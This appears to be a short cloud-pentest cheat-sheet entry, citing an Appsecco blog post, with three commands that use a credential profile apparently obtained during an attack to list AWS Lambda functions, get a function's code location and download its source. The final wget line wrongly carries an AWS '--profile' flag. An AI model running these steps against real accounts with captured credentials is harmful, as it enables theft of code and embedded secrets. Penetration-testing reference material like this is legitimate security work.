	# https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed
	>aws lambda list-functions --profile uploadcreds
	>aws lambda get-function --function-name "LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY" --query 'Code.Location' --profile uploadcreds
	>wget -O lambda-function.zip url-from-previous-query --profile uploadcreds